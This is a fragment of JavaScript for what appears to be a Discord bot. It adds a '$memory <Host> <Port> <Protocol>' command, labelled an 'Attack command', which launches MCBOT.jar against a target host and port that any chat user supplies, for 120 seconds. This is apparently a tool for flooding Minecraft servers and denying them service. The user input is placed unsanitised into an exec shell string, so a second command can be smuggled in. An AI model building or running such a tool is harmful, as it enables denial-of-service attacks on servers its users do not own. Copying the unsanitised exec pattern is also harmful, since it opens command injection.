...
if(!args[0]) {
	...
	.setColor('RANDOM')
	.setTitle('Commands')
	.setDescription("`Attack command $memory <Host> <Port> <Protocol>`")
	message.channel.send(embed1);
	return;
	}
...
if(!args[1]) {
	...
	.setColor('RANDOM')
	.setTitle('Warning')
	.setDescription("`$memory <Host> <Port> <Protocol>`")
	message.channel.send(embed1);
	return;
	}
...
exec(`java -Dperdelay=2500 -Ddelay=1 -Drmnwp=false -jar MCBOT.jar ${host}:${port} ${protocol} memory 120 -1`, (error, stdout, stderr) => {
});
setTimeout(function(){ 
